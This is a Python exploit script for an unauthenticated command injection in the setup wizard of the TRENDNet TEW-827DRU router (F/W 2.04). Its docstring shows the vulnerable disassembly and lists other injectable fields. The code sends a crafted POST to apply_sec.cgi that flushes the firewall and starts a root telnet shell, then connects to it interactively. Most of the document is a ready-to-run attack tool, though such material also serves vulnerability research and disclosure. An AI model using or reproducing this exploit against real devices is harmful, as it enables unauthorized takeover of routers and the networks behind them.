"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality. Within the setup wizard there is a command
injection processing all user defined values to the do_wizard_wan_pptp_cgi function. The vulnerable disassembly for the
first user processed values is shown below.

LOAD:0043C708                 addiu   $s0, $v0, (aUciSetNetworkW_0 - 0x4D0000)  # "uci set network.wan.hostname=%s"
LOAD:0043C70C                 la      $v0, aTDelay     # "t_delay"
LOAD:0043C710                 nop
LOAD:0043C714                 addiu   $a0, $v0, (aSystemSystem0H_0 - 0x4C0000)  # "system.@system[0].hostname"
LOAD:0043C718                 la      $v0, safe_getenv
LOAD:0043C71C                 nop
LOAD:0043C720                 move    $t9, $v0
LOAD:0043C724                 bal     safe_getenv
LOAD:0043C728                 nop
LOAD:0043C72C                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043C730                 addiu   $v1, $fp, 0x138+var_114
LOAD:0043C734                 move    $a0, $v1         # s
LOAD:0043C738                 move    $a1, $s0         # format
LOAD:0043C73C                 move    $a2, $v0
LOAD:0043C740                 la      $v0, sprintf
LOAD:0043C744                 nop
LOAD:0043C748                 move    $t9, $v0
LOAD:0043C74C                 jalr    $t9 ; sprintf
LOAD:0043C750                 nop
LOAD:0043C754                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043C758                 addiu   $v0, $fp, 0x138+var_114
LOAD:0043C75C                 move    $a0, $v0         # command
LOAD:0043C760                 la      $v0, _system
LOAD:0043C764                 nop
LOAD:0043C768                 move    $t9, $v0
LOAD:0043C76C                 jalr    $t9 ; _system
LOAD:0043C770                 nop

system.@system[0].hostname can be replace with other user defined values requiring minimal changes to the exploit. The
other valid values are:
    - cameo.wan.wan_pptp_server_ip
    - cameo.wan.wan_pptp_username
    - cameo.wan.wan_pptp_password
    - cameo.wan.wan_pptp_ipaddr (requires cameo.wan.wan_pptp_dynamic != 1)
    - cameo.wan.wan_pptp_netmask (requires cameo.wan.wan_pptp_dynamic != 1)
    - cameo.wan.wan_pptp_gateway (requires cameo.wan.wan_pptp_dynamic != 1)


The packet is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import mow
import time
import argparse
import telnetlib


def telnet_connect(host, port):
    """
    Connect to telnet server.

    :param host: Telnet server IP.
    :type host: str

    :param port: Telnet server listening port.
    :type port: int

    :return: Telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit(host, port, command):
    """
    Generate packet to exploit the target.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param command: Command to execute upon successful exploitation.
    :type command: str

    :return: Packet to send to the target.
    :rtype: bytes
    """
    command = b'`' + bytes(command.replace(' ', '${IFS}'), 'utf8') + b'`'
    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'pptp',
            b'cameo.wan.wan_pptp_dynamic': b'1',
            b'system.@system[0].hostname': command}

    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Attempt to exploit the target establishing a reverse shell.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param telnet_port: Port to open to establish the telnet connection.
    :type telnet_port: int
    """
    telnet_command = 'iptables -F|telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit(host, port, telnet_command)

    mow.send_packet(host, port, packet, True)

    time.sleep(3)
    tn = telnet_connect(host, telnet_port)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated command injection exploit for TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int, default=5555)

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.tport)
